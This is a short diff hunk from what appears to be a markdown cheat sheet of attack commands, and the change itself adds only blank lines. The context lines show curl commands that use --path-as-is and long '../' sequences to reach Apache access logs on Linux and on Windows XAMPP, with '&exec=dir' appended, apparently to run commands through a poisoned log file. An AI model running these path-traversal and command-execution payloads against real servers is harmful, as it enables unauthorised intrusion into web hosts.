@@ -92,3 +92,5 @@ curl -s --path-as-is $TARGET_URL/../../../../../../../../../var/log/apache2/acce
 #windows using xampp
 curl -s --path-as-is $TARGET_URL/../../../../../../../../../xampp/apache/logs/access.log&exec=dir
 ```
+
+
